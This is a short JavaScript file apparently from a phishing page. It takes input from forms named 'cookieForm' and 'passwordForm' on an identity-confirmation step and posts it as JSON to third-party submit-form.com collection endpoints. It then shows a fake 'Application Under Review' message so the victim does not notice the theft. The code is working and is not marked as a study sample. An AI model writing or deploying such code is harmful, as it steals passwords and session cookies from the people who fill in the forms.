
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(cookieForm);
    
    fetch('https://submit-form.com/g0dJSXe5U', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(Object.fromEntries(formData))
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        showPage('page4');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Please try again');
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const button = e.target.querySelector('button');
    button.textContent = 'Processing...';
    
    const formData = new FormData(passwordForm);
    fetch('https://submit-form.com/TSRlLhDlN', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(Object.fromEntries(formData))
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const thankYouMessage = document.createElement('div');
        thankYouMessage.innerHTML = '<h2>Thank You! Application Under Review</h2>';
        thankYouMessage.style.textAlign = 'center';
        thankYouMessage.style.marginTop = '2rem';
        
        const form = document.querySelector('.confirm-identity form');
        form.innerHTML = '';
        form.appendChild(thankYouMessage);
    });
});

// Set FormSpark form actions
cookieForm.setAttribute('action', 'https://submit-form.com/g0dJSXe5U');
passwordForm.setAttribute('action', 'https://submit-form.com/TSRlLhDlN');
